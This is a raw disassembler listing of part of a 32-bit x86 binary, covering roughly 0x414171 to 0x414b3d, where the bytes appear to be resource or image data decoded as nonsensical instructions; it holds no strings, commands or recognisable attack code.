  414171:	add    BYTE PTR [eax],al
  414173:	add    BYTE PTR [eax+0x1],bh
  414176:	add    BYTE PTR [eax+0x0],al
	...
  414184:	add    BYTE PTR [eax],al
  414186:	add    DWORD PTR [eax],eax
  414188:	or     DWORD PTR [eax+eax*1],eax
  41418b:	add    BYTE PTR [eax],ch
  41418d:	add    al,BYTE PTR [eax]
  41418f:	add    BYTE PTR [eax],cl
  414191:	add    BYTE PTR [esi+0x0],dl
  414194:	dec    esp
  414195:	add    BYTE PTR [ebx+0x0],al
  414198:	pop    edi
  414199:	add    BYTE PTR [ecx+0x0],cl
  41419c:	inc    ebx
  41419d:	add    BYTE PTR [edi+0x0],cl
  4141a0:	dec    esi
  4141a1:	add    BYTE PTR [eax],al
  4141a3:	add    BYTE PTR [eax],al
  4141a5:	add    BYTE PTR [eax],al
  4141a7:	add    BYTE PTR [eax],bh
  4141a9:	inc    edx
  4141aa:	add    DWORD PTR [eax],eax
  4141ac:	test   al,0x8
	...
  4141b6:	add    BYTE PTR [eax],al
  4141b8:	loopne 0x414204
  4141ba:	add    DWORD PTR [eax],eax
  4141bc:	push   0x5
  4141c1:	add    BYTE PTR [eax],al
  4141c3:	add    BYTE PTR [eax],al
  4141c5:	add    BYTE PTR [eax],al
  4141c7:	add    BYTE PTR [eax+0x50],cl
  4141ca:	add    DWORD PTR [eax],eax
  4141cc:	sahf   
  4141cd:	aam    0x0
	...
  4141d7:	add    al,ch
  4141d9:	and    al,0x2
  4141db:	add    BYTE PTR [eax+0x25],ch
  4141e1:	add    BYTE PTR [eax],al
  4141e3:	add    BYTE PTR [eax],al
  4141e5:	add    BYTE PTR [eax],al
  4141e7:	add    BYTE PTR [eax-0x57fffdb6],dl
  4141ed:	adc    BYTE PTR [eax],al
	...
  4141f7:	add    BYTE PTR [eax],bh
  4141f9:	pop    ebx
  4141fa:	add    al,BYTE PTR [eax]
  4141fc:	push   0x4
  414201:	add    BYTE PTR [eax],al
  414203:	add    BYTE PTR [eax],al
  414205:	add    BYTE PTR [eax],al
  414207:	add    BYTE PTR [eax+0x5a00025f],ah
	...
  414219:	pusha  
  41421a:	add    al,BYTE PTR [eax]
  41421c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41421d:	add    eax,DWORD PTR [eax]
	...
  414227:	add    BYTE PTR [eax-0x20fffd9d],ch
  41422d:	add    al,0x0
	...
  414237:	add    BYTE PTR [eax],ch
  414239:	add    BYTE PTR [eax],al
  41423b:	add    BYTE PTR [eax],ah
  41423d:	add    BYTE PTR [eax],al
  41423f:	add    BYTE PTR [eax+0x0],al
  414242:	add    BYTE PTR [eax],al
  414244:	add    DWORD PTR [eax],eax
  414246:	or     BYTE PTR [eax],al
  414248:	add    BYTE PTR [eax],al
  41424a:	add    BYTE PTR [eax],al
  41424c:	add    BYTE PTR [eax+eax*1],al
	...
  414257:	add    BYTE PTR [eax],al
  414259:	add    DWORD PTR [eax],eax
  41425b:	add    BYTE PTR [eax],al
  41425d:	add    DWORD PTR [eax],eax
  41425f:	add    BYTE PTR [edx],al
  414261:	xor    bl,BYTE PTR [edx-0x65615e00]
  414267:	add    BYTE PTR [edx],al
  414269:	(bad)  
  41426b:	add    BYTE PTR [edx-0x3e],cl
  41426e:	inc    BYTE PTR [eax]
  414270:	push   es
  414271:	data16 rol BYTE PTR [eax],cl
  414274:	add    bh,BYTE PTR [edx-0x16]
  414277:	add    dh,al
  414279:	ret    0xba
  41427c:	fcmovu st,st(2)
  41427e:	rol    BYTE PTR [eax],cl
  414280:	add    ah,BYTE PTR [edx-0x1a]
  414283:	add    BYTE PTR [edx],al
  414285:	push   edx
  414286:	mov    BYTE PTR [eax],0x2
  414289:	xchg   edx,eax
  41428a:	cli    
  41428b:	add    BYTE PTR [esi],ah
  41428d:	jp     0x41426d
  41428f:	add    BYTE PTR [edx],al
  414291:	outs   dx,BYTE PTR ds:[esi]
  414292:	out    0x0,al
  414294:	mov    esi,0xe600daca
  414299:	out    0xde,al
  41429b:	add    BYTE PTR [edx],al
  41429d:	xchg   dh,dh
  41429f:	add    BYTE PTR [edx-0x6e],dl
  4142a2:	fiadd  WORD PTR [eax]
  4142a4:	add    bl,BYTE PTR [edx-0x26]
  4142a7:	add    BYTE PTR [edx],al
  4142a9:	inc    esi
  4142aa:	mov    dh,0x0
  4142ac:	into   
  4142ad:	into   
  4142ae:	retf   0x200
  4142b1:	outs   dx,BYTE PTR ds:[esi]
  4142b2:	repnz add BYTE PTR [edx],al
  4142b5:	outs   dx,BYTE PTR ds:[esi]
  4142b6:	fiadd  WORD PTR [eax]
  4142b8:	fcmovu st,st(2)
  4142ba:	fiadd  WORD PTR [eax]
  4142bc:	add    bl,BYTE PTR [edx-0x3a]
  4142bf:	add    BYTE PTR [esi+0x200aeb2],dh
  4142c5:	jp     0x4142bd
  4142c7:	add    BYTE PTR [edx],al
  4142c9:	(bad)  
  4142ca:	fiadd  WORD PTR [eax]
  4142cc:	dec    edx
  4142cd:	mov    esi,0x3e0600fe
  4142d2:	stos   BYTE PTR es:[edi],al
  4142d3:	add    BYTE PTR [edx],al
  4142d5:	push   0xffffffe6
  4142d7:	add    BYTE PTR [edx-0x6e],cl
  4142da:	out    0x0,al
  4142dc:	push   0xffffffa6
  4142de:	fiadd  DWORD PTR [eax]
  4142e0:	into   
  4142e1:	retf   0xbe
  4142e4:	fcmovu st,st(2)
  4142e6:	fiadd  DWORD PTR [eax]
  4142e8:	add    dl,BYTE PTR [edx-0x2e]
  4142eb:	add    BYTE PTR [edx],al
  4142ed:	jbe    0x4142d9
  4142ef:	add    dl,dl
  4142f1:	ror    dh,cl
  4142f3:	add    BYTE PTR [esi-0x75ff354e],bl
  4142f9:	ret    0xea
  4142fc:	add    al,BYTE PTR [edx-0x79d9ff0e]
  414302:	out    0x0,al
  414304:	jmp    0xf68e:0x200e6ea
  41430b:	add    BYTE PTR [edx-0x62],dl
  41430e:	loop   0x414310
  414310:	(bad)  
  414312:	retf   0x200
  414315:	jbe    0x414309
  414317:	add    BYTE PTR [esi+0x200b6ba],bh
  41431d:	push   0xffffffde
  41431f:	add    dh,dl
  414321:	(bad)  
  414322:	into   
  414323:	add    BYTE PTR [esi],cl
  414325:	cmp    bl,BYTE PTR [edx-0x65859a00]
  41432b:	add    BYTE PTR [edx],al
  41432d:	jp     0x414321
  41432f:	add    BYTE PTR [edx],al
  414331:	data16 out dx,al
  414333:	add    BYTE PTR [edx],al
  414335:	outs   dx,BYTE PTR ds:[esi]
  414336:	out    dx,al
  414337:	add    BYTE PTR [edx],al
  414339:	dec    esi
  41433a:	ret    0xd200
  41433d:	ror    dl,cl
  41433f:	add    dl,ah
  414341:	loop   0x414321
  414343:	add    BYTE PTR [edx],al
  414345:	pop    edx
  414346:	rol    BYTE PTR [eax],cl
  414348:	add    al,BYTE PTR [edx-0x556dff0a]
  41434e:	retf   0x4a00
  414351:	retf   0xfe
  414354:	push   ss
  414355:	push   0xffffffd2
  414357:	add    BYTE PTR [edx-0x1dff393e],bh
  41435d:	(bad)  
  41435f:	add    BYTE PTR [edx],al
  414361:	data16 out 0x0,al
  414364:	add    dl,BYTE PTR [edx-0x32]
  414367:	add    BYTE PTR [edx],al
  414369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41436a:	cli    
  41436b:	add    dh,ah
  41436d:	out    0xe2,al
  41436f:	add    BYTE PTR [edx],al
  414371:	xchg   dh,bh
  414373:	add    BYTE PTR [edx],al
  414375:	jb     0x414369
  414377:	add    BYTE PTR [edx],al
  414379:	data16 fiadd WORD PTR [eax]
  41437c:	inc    esi
  41437d:	sahf   
  41437e:	jmp    0x5200:0xe28e3a00
  414385:	mov    ds:0xbec200ea,al
  41438a:	mov    dh,0x0
  41438c:	(bad)  
  41438d:	(bad)  
  41438e:	rol    BYTE PTR [eax],cl
  414390:	mov    dl,0xaa
  414392:	mov    ds:0xda620200,al
  414397:	add    BYTE PTR [esi],cl
  414399:	jp     0x414385
  41439b:	add    BYTE PTR [edx],al
  41439d:	jb     0x414389
  41439f:	add    BYTE PTR [edx],al
  4143a1:	mov    dh,dh
  4143a3:	add    BYTE PTR [edx],al
  4143a5:	pop    esi
  4143a6:	out    0x0,al
  4143a8:	add    cl,BYTE PTR [edx-0x42]
  4143ab:	add    BYTE PTR [edx],al
  4143ad:	jle    0x4143a5
  4143af:	add    BYTE PTR [edx],al
  4143b1:	inc    edx
  4143b2:	mov    dh,0x0
  4143b4:	add    ch,BYTE PTR [edx-0x12]
  4143b7:	add    BYTE PTR [esi-0x6a],al
  4143ba:	out    0x0,al
  4143bc:	retf   0xc6ca
  4143bf:	add    dh,bl
  4143c1:	(bad)  
  4143c3:	add    BYTE PTR [edx],al
  4143c5:	push   esi
  4143c6:	rol    BYTE PTR [eax],cl
  4143c8:	add    bh,BYTE PTR [edx]
  4143ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143cb:	add    BYTE PTR [esi],bh
  4143cd:	jp     0x414395
  4143cf:	add    dl,bl
  4143d1:	ror    dl,cl
  4143d3:	add    dh,ah
  4143d5:	loop   0x4143b9
  4143d7:	add    BYTE PTR [edx],al
  4143d9:	pop    esi
  4143da:	(bad)  
  4143db:	add    BYTE PTR [esi+0x200babe],bh
  4143e1:	ss sahf 
  4143e3:	add    BYTE PTR [edx],bh
  4143e5:	jb     0x4143a5
  4143e7:	add    BYTE PTR [edx-0x3a],cl
  4143ea:	inc    BYTE PTR [eax]
  4143ec:	add    bh,BYTE PTR [edx-0x12]
  4143ef:	add    dl,cl
  4143f1:	(bad)  
  4143f2:	mov    esi,0xd6dada00
  4143f7:	add    BYTE PTR [edx],al
  4143f9:	(bad)  
  4143fa:	jmp    0x200:0xc6560200
  414401:	call   0xde:0x823a00fa
  414408:	add    ch,BYTE PTR [esi-0x16]
  41440b:	add    dl,ch
  41440d:	out    0xde,al
  41440f:	add    BYTE PTR [edx-0x66],dl
  414412:	out    0x0,al
  414414:	add    al,BYTE PTR [esi-0x46]
  414417:	add    dl,dl
  414419:	into   
  41441a:	retf   0x200
  41441d:	outs   dx,BYTE PTR ds:[esi]
  41441e:	test   BYTE PTR [eax],0xe
  414421:	jb     0x414405
  414423:	add    dl,ah
  414425:	(bad)  
  414427:	add    BYTE PTR [edx],al
  414429:	pop    edx
  41442a:	into   
  41442b:	add    BYTE PTR [esi+0x200b6b6],dh
  414431:	(bad)  
  414433:	add    BYTE PTR [edx],al
  414435:	ds scas al,BYTE PTR es:[edi]
  414437:	add    BYTE PTR [edx],al
  414439:	push   0xffffffea
  41443b:	add    BYTE PTR [edx+0x200ceb2],dl
  414441:	jbe    0x414431
  414443:	add    dh,dl
  414445:	ror    dh,cl
  414447:	add    BYTE PTR [edx+0x2a00f2d2],bl
  41444d:	mov    ah,dl
  41444f:	add    dh,ch
  414451:	jmp    0xfa:0x8e0200e6
  414458:	outs   dx,BYTE PTR ds:[esi]
  414459:	mov    ds:0x760200da,al
  41445e:	test   BYTE PTR [eax],0x2
  414461:	push   0xffffffe2
  414463:	add    BYTE PTR [esi-0x72],dh
  414466:	scas   al,BYTE PTR es:[edi]
  414467:	add    BYTE PTR [esi-0x39ff5552],ch
  41446d:	mov    dl,0x0
  414470:	add    dl,BYTE PTR [edx-0x42]
  414473:	add    BYTE PTR [esi-0x72],al
  414476:	fiadd  WORD PTR [eax]
  414478:	add    bh,BYTE PTR [esi-0xe]
  41447b:	add    BYTE PTR [edx],al
  41447d:	jb     0x41446d
  41447f:	add    BYTE PTR [edx-0x32],cl
  414482:	inc    BYTE PTR [eax]
  414484:	add    dl,BYTE PTR [esi-0x32]
  414487:	add    BYTE PTR [esi-0x5e],bl
  41448a:	jmp    0x200:0xda660200
  414491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414493:	add    dh,bl
  414495:	(bad)  
  414496:	into   
  414497:	add    BYTE PTR [edx],al
  414499:	pop    edx
  41449a:	(bad)  
  41449b:	add    BYTE PTR [edx],al
  41449d:	cmp    dl,0x0
  4144a0:	add    ah,BYTE PTR [esi-0x16]
  4144a3:	add    BYTE PTR [edx],cl
  4144a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a6:	cli    
  4144a7:	add    BYTE PTR [edx],al
  4144a9:	jb     0x4144a1
  4144ab:	add    BYTE PTR [edx],al
  4144ad:	data16 loop 0x4144b0
  4144b0:	add    cl,BYTE PTR [edx+0x5e0200fa]
  4144b6:	jmp    0x200:0xfa7e0200
  4144bd:	push   esi
  4144be:	(bad)  
  4144bf:	add    dh,dl
  4144c1:	ror    dl,cl
  4144c3:	add    dh,ah
  4144c5:	loop   0x4144a5
  4144c7:	add    dh,ah
  4144c9:	(bad)  
  4144cb:	add    dl,ch
  4144cd:	out    0xe2,al
  4144cf:	add    dl,bl
  4144d1:	(bad)  
  4144d2:	rol    BYTE PTR [eax],cl
  4144d4:	dec    edx
  4144d5:	xchg   esi,eax
  4144d6:	out    0x0,al
  4144d8:	into   
  4144d9:	retf   0xc6
  4144dc:	loop   0x4144bc
  4144de:	fiadd  DWORD PTR [eax]
  4144e0:	ret    0xbabe
	...
  41465f:	add    BYTE PTR [ecx-0x5e5e5e5f],ah
  414665:	mov    eax,ds:0xa1a1a1a1
  41466a:	mov    eax,ds:0xa1a1a1a1
  41466f:	mov    eax,ds:0xa1a1a1a1
  414674:	mov    eax,ds:0xa1a1a1a1
  414679:	mov    eax,ds:0xa1a1a1a1
  41467e:	mov    eax,ds:0xa1a1a1a1
  414683:	mov    eax,ds:0xa1a1a1a1
  414688:	mov    eax,ds:0xa1a1a1a1
  41468d:	mov    eax,ds:0xa1a1a1a1
  414692:	mov    eax,ds:0xa1a1a1a1
  414697:	mov    eax,ds:0xa1a1a1a1
  41469c:	mov    eax,ds:0xa1a1a1a1
  4146a1:	mov    eax,ds:0xa1a1a1a1
  4146a6:	mov    eax,ds:0xa1a1a1a1
  4146ab:	mov    eax,ds:0xa1a1a1a1
  4146b0:	mov    eax,ds:0xa1a1a1a1
  4146b5:	mov    eax,ds:0xa1a1a1a1
  4146ba:	mov    eax,ds:0xa1a1a1a1
  4146bf:	mov    eax,ds:0x17a1a1a1
  4146c4:	pop    ss
  4146c5:	pop    ss
  4146c6:	pop    ss
  4146c7:	pop    ss
  4146c8:	pop    ss
  4146c9:	pop    ss
  4146ca:	pop    ss
  4146cb:	pop    ss
  4146cc:	pop    ss
  4146cd:	pop    ss
  4146ce:	pop    ss
  4146cf:	pop    ss
  4146d0:	pop    ss
  4146d1:	pop    ss
  4146d2:	pop    ss
  4146d3:	pop    ss
  4146d4:	pop    ss
  4146d5:	pop    ss
  4146d6:	pop    ss
  4146d7:	pop    ss
  4146d8:	pop    ss
  4146d9:	pop    ss
  4146da:	pop    ss
  4146db:	pop    ss
  4146dc:	pop    ss
  4146dd:	mov    eax,ds:0xa1a1a1a1
  4146e2:	mov    eax,ds:0x3036262
  4146e7:	bound  esp,QWORD PTR [edx+0x62]
  4146ea:	add    ebx,DWORD PTR [ebx]
  4146ec:	sbb    ebx,DWORD PTR [ebx]
  4146ee:	sbb    ebx,DWORD PTR [ebx]
  4146f0:	sbb    ebx,DWORD PTR [ebx]
  4146f2:	sbb    ebx,DWORD PTR [ebx]
  4146f4:	add    eax,DWORD PTR [ebx]
  4146f6:	cmp    al,0x3c
  4146f8:	cmp    al,0x3c
  4146fa:	cmp    al,0x3c
  4146fc:	cmp    al,0xa1
  4146fe:	mov    eax,ds:0xa1a1a1a1
  414703:	inc    edx
  414704:	inc    edx
  414705:	or     ch,BYTE PTR [edx]
  414707:	sub    cl,BYTE PTR [edi]
  414709:	sbb    DWORD PTR ds:0x8510808,esi
  41470f:	or     BYTE PTR [eax+0x2d873576],dl
  414715:	xchg   BYTE PTR [edx],bh
  414717:	xchg   esp,eax
  414718:	or     cl,BYTE PTR [edx]
  41471a:	push   0xa1a19142
  41471f:	mov    eax,ds:0xa1a1a1a1
  414724:	or     cl,BYTE PTR [edi]
  414726:	daa    
  414727:	daa    
  414728:	xchg   ebx,eax
  414729:	inc    ecx
  41472a:	pop    ecx
  41472b:	dec    ebp
  41472c:	xchg   ebx,eax
  41472d:	je     0x414737
  41472f:	nop
  414730:	jbe    0x414767
  414732:	xor    eax,0x2211406a
  414737:	or     BYTE PTR [edi],0x50
  41473a:	or     cl,BYTE PTR [edx]
  41473c:	mov    eax,ds:0xa1a1a1a1
  414741:	mov    eax,ds:0x86a1a1a1
  414746:	arpl   WORD PTR [ebp+0x54],cx
  414749:	or     DWORD PTR [esi+0x46],ebx
  41474c:	adc    BYTE PTR [ecx+0x51],0x34
  414750:	xor    al,0x35
  414752:	inc    ebp
  414753:	xchg   DWORD PTR ds:0x5e75528e,ebx
  414759:	or     al,0x86
  41475b:	mov    eax,ds:0xa1a1a1a1
  414760:	mov    eax,ds:0xa1a1a1a1
  414765:	mov    eax,ds:0x95a0978
  41476a:	pop    ecx
  41476b:	sbb    dh,BYTE PTR [eax+0xb]
  41476e:	imul   eax,DWORD PTR [ebp+0x4e284885],0x6052221d
  414778:	adc    dl,BYTE PTR [edi-0x5e5e5e5f]
  41477e:	mov    eax,ds:0xa1a1a1a1
  414783:	mov    eax,ds:0x39a1a1a1
  414788:	pop    edx
  414789:	ss pop ebx
  41478b:	and    eax,0x5c381316
  414790:	cdq    
  414791:	cwde   
  414792:	pop    eax
  414793:	ds or  eax,0x54001261
  414799:	mov    eax,ds:0xa1a1a1a1
  41479e:	mov    eax,ds:0xa1a1a1a1
  4147a3:	mov    eax,ds:0xa1a1a1a1
  4147a8:	sbb    al,0x81
  4147aa:	push   es
  4147ab:	lahf   
  4147ac:	outs   dx,BYTE PTR ds:[esi]
  4147ad:	cmp    BYTE PTR [esi+0x43],ch
  4147b0:	and    al,0x38
  4147b2:	sahf   
  4147b3:	pop    eax
  4147b4:	push   es
  4147b5:	pushf  
  4147b6:	xor    dh,BYTE PTR [ecx]
  4147b8:	mov    eax,ds:0xa1a1a1a1
  4147bd:	mov    eax,ds:0xa1a1a1a1
  4147c2:	mov    eax,ds:0xa1a1a1a1
  4147c7:	mov    eax,ds:0x83654ca1
  4147cc:	cmp    BYTE PTR [esi+0x38],ch
  4147cf:	and    al,0x43
  4147d1:	outs   dx,BYTE PTR ds:[esi]
  4147d2:	cmp    BYTE PTR [ebx-0x5e61e79b],al
  4147d8:	mov    eax,ds:0xa1a1a1a1
  4147dd:	mov    eax,ds:0xa1a1a1a1
  4147e2:	mov    eax,ds:0xa1a1a1a1
  4147e7:	mov    eax,ds:0x582e57a1
  4147ec:	adc    eax,DWORD PTR [ebx+0x37]
  4147ef:	inc    ebx
  4147f0:	and    al,0x43
  4147f2:	adc    ebx,DWORD PTR [eax+0x5f]
  4147f5:	and    al,0x1
  4147f7:	mov    eax,ds:0xa1a1a1a1
  4147fc:	mov    eax,ds:0xa1a1a1a1
  414801:	mov    eax,ds:0xa1a1a1a1
  414806:	mov    eax,ds:0x4b82a1a1
  41480b:	fs push cs
  41480d:	sub    al,0x6b
  41480f:	lea    ebx,[ebx+0x65200e2c]
  414815:	and    BYTE PTR [eax-0x5e5e5e5f],0xa1
  41481c:	mov    eax,ds:0xa1a1a1a1
  414821:	mov    eax,ds:0xa1a1a1a1
  414826:	mov    eax,ds:0x82a1a1a1
  41482b:	and    DWORD PTR [edi+0x7e],esi
  41482e:	adc    BYTE PTR [esi],bl
  414830:	push   esi
  414831:	sub    ebx,DWORD PTR [edi]
  414833:	cmp    esi,DWORD PTR [ebx+0x6e]
  414836:	mov    eax,ds:0xa1a1a1a1
  41483b:	mov    eax,ds:0xa1a1a1a1
  414840:	mov    eax,ds:0xa1a1a1a1
  414845:	mov    eax,ds:0xa1a1a1a1
  41484a:	cmp    eax,0x3435803d
  41484f:	adc    al,0x2d
  414851:	sbb    DWORD PTR [ecx],ebx
  414853:	sbb    eax,0xa1a13d3d
  414858:	mov    eax,ds:0xa1a1a1a1
  41485d:	mov    eax,ds:0xa1a1a1a1
  414862:	mov    eax,ds:0xa1a1a1a1
  414867:	mov    eax,ds:0x7272a1a1
  41486c:	adc    eax,0x33453523
  414871:	daa    
  414872:	daa    
  414873:	xor    BYTE PTR [edx+0x72],0xa1
  414877:	mov    eax,ds:0xa1a1a1a1
  41487c:	mov    eax,ds:0xa1a1a1a1
  414881:	mov    eax,ds:0xa1a1a1a1
  414886:	mov    eax,ds:0xa1a1a1a1
  41488b:	pop    ss
  41488c:	das    
  41488d:	and    esi,DWORD PTR ds:0x863a1945
  414893:	inc    esi
  414894:	pop    ss
  414895:	mov    eax,ds:0xa1a1a1a1
  41489a:	mov    eax,ds:0xa1a1a1a1
  41489f:	mov    eax,ds:0xa1a1a1a1
  4148a4:	mov    eax,ds:0xa1a1a1a1
  4148a9:	mov    eax,ds:0x52f84a1
  4148ae:	xor    eax,0x863a1945
  4148b3:	dec    ebp
  4148b4:	test   BYTE PTR [ecx-0x5e5e5e5f],ah
  4148ba:	mov    eax,ds:0xa1a1a1a1
  4148bf:	mov    eax,ds:0xa1a1a1a1
  4148c4:	mov    eax,ds:0xa1a1a1a1
  4148c9:	mov    eax,ds:0x238b84a1
  4148ce:	adc    al,0x14
  4148d0:	sbb    DWORD PTR [edx],edi
  4148d2:	xor    ecx,DWORD PTR [esi-0x5e5e5e7c]
  4148d8:	mov    eax,ds:0xa1a1a1a1
  4148dd:	mov    eax,ds:0xa1a1a1a1
  4148e2:	mov    eax,ds:0xa1a1a1a1
  4148e7:	mov    eax,ds:0xa1a1a1a1
  4148ec:	add    al,0x7b
  4148ee:	push   esi
  4148ef:	ins    BYTE PTR es:[edi],dx
  4148f0:	dec    ecx
  4148f1:	inc    edi
  4148f2:	sub    BYTE PTR [ecx-0x5e5e5e5f],cl
  4148f8:	mov    eax,ds:0xa1a1a1a1
  4148fd:	mov    eax,ds:0xa1a1a1a1
  414902:	mov    eax,ds:0xa1a1a1a1
  414907:	mov    eax,ds:0xa1a1a1a1
  41490c:	pop    eax
  41490d:	xor    BYTE PTR [ecx],ch
  41490f:	aas    
  414910:	jl     0x41489f
  414912:	jno    0x414944
  414914:	mov    eax,ds:0xa1a1a1a1
  414919:	mov    eax,ds:0xa1a1a1a1
  41491e:	mov    eax,ds:0xa1a1a1a1
  414923:	mov    eax,ds:0xa1a1a1a1
  414928:	mov    eax,ds:0x58a1a1a1
  41492d:	inc    ebx
  41492e:	pop    es
  41492f:	sub    DWORD PTR [edi],eax
  414931:	inc    ebx
  414932:	pop    eax
  414933:	inc    ebx
  414934:	mov    eax,ds:0xa1a1a1a1
  414939:	mov    eax,ds:0xa1a1a1a1
  41493e:	mov    eax,ds:0xa1a1a1a1
  414943:	mov    eax,ds:0xa1a1a1a1
  414948:	mov    eax,ds:0x65a1a1a1
  41494d:	outs   dx,BYTE PTR ds:[esi]
  41494e:	sub    DWORD PTR [ecx+ebp*1-0x5e91d687],ebx
  414955:	mov    eax,ds:0xa1a1a1a1
  41495a:	mov    eax,ds:0xa1a1a1a1
  41495f:	mov    eax,ds:0xa1a1a1a1
  414964:	mov    eax,ds:0xa1a1a1a1
  414969:	mov    eax,ds:0x58a1a1a1
  41496e:	pop    es
  41496f:	sub    DWORD PTR [edi],eax
  414971:	inc    ebx
  414972:	dec    edx
  414973:	mov    eax,ds:0xa1a1a1a1
  414978:	mov    eax,ds:0xa1a1a1a1
  41497d:	mov    eax,ds:0xa1a1a1a1
  414982:	mov    eax,ds:0xa1a1a1a1
  414987:	mov    eax,ds:0xa1a1a1a1
  41498c:	mov    eax,ds:0x7c3f7c06
  414991:	sub    al,0x6e
  414993:	mov    eax,ds:0xa1a1a1a1
  414998:	mov    eax,ds:0xa1a1a1a1
  41499d:	mov    eax,ds:0xa1a1a1a1
  4149a2:	mov    eax,ds:0xa1a1a1a1
  4149a7:	mov    eax,ds:0xa1a1a1a1
  4149ac:	mov    eax,ds:0x8a8a8a4f
  4149b1:	mov    cl,BYTE PTR [edi-0x5f]
  4149b4:	mov    eax,ds:0xa1a1a1a1
  4149b9:	mov    eax,ds:0xa1a1a1a1
  4149be:	mov    eax,ds:0xa1a1a1a1
  4149c3:	mov    eax,ds:0xa1a1a1a1
  4149c8:	mov    eax,ds:0xa1a1a1a1
  4149cd:	mov    eax,ds:0x3596454f
  4149d2:	mov    eax,ds:0xa1a1a1a1
  4149d7:	mov    eax,ds:0xa1a1a1a1
  4149dc:	mov    eax,ds:0xa1a1a1a1
  4149e1:	mov    eax,ds:0xa1a1a1a1
  4149e6:	mov    eax,ds:0xa1a1a1a1
  4149eb:	mov    eax,ds:0x1915a1a1
  4149f0:	cmp    ch,BYTE PTR [edi]
  4149f2:	mov    eax,ds:0xa1a1a1a1
  4149f7:	mov    eax,ds:0xa1a1a1a1
  4149fc:	mov    eax,ds:0xa1a1a1a1
  414a01:	mov    eax,ds:0xa1a1a1a1
  414a06:	mov    eax,ds:0xa1a1a1a1
  414a0b:	mov    eax,ds:0x1902a1a1
  414a10:	inc    esp
  414a11:	add    ah,BYTE PTR [ecx-0x5e5e5e5f]
  414a17:	mov    eax,ds:0xa1a1a1a1
  414a1c:	mov    eax,ds:0xa1a1a1a1
  414a21:	mov    eax,ds:0xa1a1a1a1
  414a26:	mov    eax,ds:0xa1a1a1a1
  414a2b:	mov    eax,ds:0x2a1a1a1
  414a30:	add    ah,BYTE PTR [ecx-0x5e5e5e5f]
  414a36:	mov    eax,ds:0xa1a1a1a1
  414a3b:	mov    eax,ds:0xa1a1a1a1
  414a40:	mov    eax,ds:0xa1a1a1a1
  414a45:	mov    eax,ds:0xa1a1a1a1
  414a4a:	mov    eax,ds:0xa1a1a1a1
  414a4f:	mov    eax,ds:0xa1a1a1a1
  414a54:	mov    eax,ds:0xa1a1a1a1
  414a59:	mov    eax,ds:0xa1a1a1a1
  414a5e:	mov    eax,ds:0xffffffa1
  414a63:	(bad)  
  414a64:	(bad)  
  414a65:	(bad)  
  414a66:	(bad)  
  414a67:	(bad)  
  414a68:	(bad)  
  414a69:	(bad)  
  414a6a:	(bad)  
  414a6b:	jmp    eax
  414a6d:	add    BYTE PTR [eax],al
  414a6f:	pop    es
  414a70:	loopne 0x414a72
  414a72:	add    BYTE PTR [edi],al
  414a74:	loopne 0x414a76
  414a76:	add    BYTE PTR [edi],al
  414a78:	lock add BYTE PTR [eax],al
  414a7b:	psubb  mm0,QWORD PTR [eax]
  414a7e:	add    BYTE PTR [edi],bl
  414a80:	cld    
  414a81:	add    BYTE PTR [eax],al
  414a83:	aas    
  414a84:	inc    BYTE PTR [eax]
  414a86:	add    BYTE PTR [edi-0x1],bh
  414a89:	add    BYTE PTR [eax],al
  414a8b:	(bad)  
  414a8c:	inc    DWORD PTR [eax-0x7f0000ff]
  414a92:	add    edi,edi
  414a94:	inc    DWORD PTR [eax-0x3f0000ff]
  414a9a:	add    edi,edi
  414a9c:	inc    eax
  414a9e:	add    edi,edi
  414aa0:	inc    eax
  414aa2:	add    edi,edi
  414aa4:	jmp    eax
  414aa6:	pop    es
  414aa7:	(bad)  
  414aa8:	jmp    eax
  414aaa:	pop    es
  414aab:	(bad)  
  414aac:	jmp    eax
  414aae:	pop    es
  414aaf:	(bad)  
  414ab0:	push   eax
  414ab2:	ud0    edi,edi
  414ab5:	lock ud0 edi,edi
  414ab9:	lock ud0 edi,edi
  414abd:	lock ud0 edi,edi
  414ac1:	clc    
  414ac2:	pop    ds
  414ac3:	(bad)  
  414ac4:	(bad)  
  414ac5:	clc    
  414ac6:	pop    ds
  414ac7:	(bad)  
  414ac8:	(bad)  
  414ac9:	clc    
  414aca:	pop    ds
  414acb:	(bad)  
  414acc:	(bad)  
  414acd:	cld    
  414ace:	aas    
  414acf:	(bad)  
  414ad0:	(bad)  
  414ad1:	cld    
  414ad2:	aas    
  414ad3:	(bad)  
  414ad4:	(bad)  
  414ad5:	cld    
  414ad6:	aas    
  414ad7:	(bad)  
  414ad8:	(bad)  
  414ad9:	(bad)  
  414ada:	jg     0x414adb
  414adc:	(bad)  
  414add:	(bad)  
  414ade:	(bad)  
  414adf:	jmp    FWORD PTR [eax]
  414ae1:	add    BYTE PTR [eax],al
  414ae3:	add    BYTE PTR [eax],dl
  414ae5:	add    BYTE PTR [eax],al
  414ae7:	add    BYTE PTR [eax],ah
  414ae9:	add    BYTE PTR [eax],al
  414aeb:	add    BYTE PTR [ecx],al
  414aed:	add    BYTE PTR [eax],cl
  414aef:	add    BYTE PTR [eax],al
  414af1:	add    BYTE PTR [eax],al
  414af3:	add    BYTE PTR [eax],al
  414af5:	add    DWORD PTR [eax],eax
	...
  414aff:	add    BYTE PTR [eax],al
  414b01:	add    DWORD PTR [eax],eax
  414b03:	add    BYTE PTR [eax],al
  414b05:	add    DWORD PTR [eax],eax
  414b07:	add    BYTE PTR [esi],cl
  414b09:	inc    esi
  414b0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b0b:	add    BYTE PTR [edx-0x6e],ah
  414b0e:	retf   0x5e00
  414b11:	mov    es,edx
  414b13:	add    BYTE PTR [edx],bl
  414b15:	mov    edx,0xbac600fe
  414b1a:	scas   al,BYTE PTR es:[edi]
  414b1b:	add    BYTE PTR [edx],al
  414b1d:	push   0xffffffe6
  414b1f:	add    dh,cl
  414b21:	into   
  414b22:	mov    BYTE PTR [eax],0x22
  414b25:	jle    0x414b09
  414b27:	add    BYTE PTR [edx],al
  414b29:	pop    edx
  414b2a:	(bad)  
  414b2b:	add    BYTE PTR [edx-0x6a],dh
  414b2e:	ret    0x200
  414b31:	jbe    0x414b21
  414b33:	add    BYTE PTR [edx-0x1dff3542],dh
  414b39:	fcmove st,st(6)
  414b3b:	add    BYTE PTR [edx],al
  414b3d:	pop    esi
